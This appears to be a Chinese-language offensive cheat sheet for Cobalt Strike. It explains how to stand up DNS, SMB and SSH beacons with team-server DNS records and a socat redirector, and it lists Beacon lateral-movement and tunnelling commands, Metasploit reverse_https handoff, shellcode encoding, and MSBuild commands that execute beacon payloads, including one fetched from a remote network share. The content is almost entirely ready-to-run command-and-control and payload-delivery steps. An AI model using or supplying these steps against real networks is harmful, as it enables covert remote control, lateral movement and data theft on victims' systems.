# Cobalt Strike - Beacons

## DNS Beacon

### DNS 配置

* 为该域名编辑 `区域文件 (Zone File)`
* 为 Cobalt Strike 系统创建一个 `A 记录`
* 创建一个指向 Cobalt Strike 系统 FQDN 的 `NS 记录`

你的 Cobalt Strike 团队服务器 (team server) 系统必须对你指定的域名具有权威性。创建一个 `DNS A` 记录并将其指向你的 Cobalt Strike 团队服务器。使用 `DNS NS` 记录将多个域名或子域名委派给 Cobalt Strike 团队服务器的 `A` 记录。

Digital Ocean 上的 DNS 示例：

```powershell
NS  example.com                     指向 10.10.10.10.            86400
NS  polling.campaigns.example.com   指向 campaigns.example.com. 3600
A campaigns.example.com           指向 10.10.10.10             3600 
```

创建 DNS 监听器 (`Beacon DNS`) 后，验证你的域名是否解析为 `0.0.0.0`：

* `nslookup jibberish.beacon polling.campaigns.domain.com`
* `nslookup jibberish.beacon campaigns.domain.com`

如果你在 DNS 方面遇到问题，可以重启 `systemd` 服务并强制使用 Google DNS 名称服务器。

```powershell
systemctl disable systemd-resolved
systemctl stop systemd-resolved
rm /etc/resolv.conf
echo "nameserver 8.8.8.8" >  /etc/resolv.conf
echo "nameserver 8.8.4.4" >>  /etc/resolv.conf
```

### DNS 重定向器 (DNS Redirector)

```ps1
socat -T 1 udp4-listen:53,fork udp4:teamserver.example.net:53
```

使用 `tcpdump -l -n -s 5655 -i eth0  udp port 53` 调试 DNS 查询。

### DNS 模式 (DNS Mode)

| 模式 | 描述 |
| --- | --- |
| `mode dns-txt` | DNS TXT 记录数据通道（默认值） |
| `mode dns`     | DNS A 记录数据通道 |
| `mode dns6`    | DNS AAAA 记录通道 |

## SMB Beacon

```powershell
link [主机名] [管道名称]
connect [主机名] [端口]
unlink [主机名] [PID]
jump [利用模块] [主机名] [管道]
```

SMB Beacon 使用命名管道 (Named Pipes)。在运行时你可能会遇到以下错误代码：

| 错误代码 | 含义 | 描述 |
|------------|----------------------|----------------------------------------------------|
| 2          | 文件未找到 (File Not Found) | 没有可供你 link (连接) 的 Beacon |
| 5          | 访问被拒绝 (Access is denied) | 凭据无效或你没有权限 |
| 53         | 错误的网通路径 (Bad Netpath) | 你与目标系统没有信任关系。那里可能有 Beacon，也可能没有。 |

## SSH Beacon

```powershell
# 部署 Beacon
beacon> help ssh
用法: ssh [目标:端口] [用户名] [密码]
生成一个 SSH 客户端并尝试登录到指定目标

beacon> help ssh-key
用法: ssh [目标:端口] [用户名] [/路径/到/key.pem]
生成一个 SSH 客户端并尝试登录到指定目标

# Beacon 命令
upload                    上传文件
download                  下载文件
socks                     启动 SOCKS4a 服务器以中继流量
sudo                      通过 sudo 运行命令
rportfwd                  设置远程端口转发 (reverse port forward)
shell                     通过 shell 执行命令
```

## Metasploit 兼容性 (Metasploit compatibility)

* Payload: `windows/meterpreter/reverse_http` 或 `windows/meterpreter/reverse_https`
* 将 `LHOST` 和 `LPORT` 设置为 Beacon
* 将 `DisablePayloadHandler` 设置为 `True`
* 将 `PrependMigrate` 设置为 `True`
* `exploit -j`

## 自定义 Payload (Custom Payloads)

```powershell
* Attacks > Packages > Payload Generator 
* Attacks > Packages > Scripted Web Delivery (S)
$ python2 ./shellcode_encoder.py -cpp -cs -py payload.bin MySecretPassword xor
$ C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Windows\Temp\dns_raw_stageless_x64.xml
$ %windir%\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe \\10.10.10.10\Shared\dns_raw_stageless_x86.xml
```

## 参考资料 (References)

* [Cobalt Strike > User Guide > DNS Beacon](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/listener-infrastructue_beacon-dns.htm)
* [Simple DNS Redirectors for Cobalt Strike - Thursday 11 March, 2021](https://www.cobaltstrike.com/blog/simple-dns-redirectors-for-cobalt-strike)
* [CobaltStrike DNS Beacon Lab Setup - rioasmara - March 18, 2023](https://rioasmara.com/2023/03/18/cobaltstrike-dns-beacon-lab-setup/)
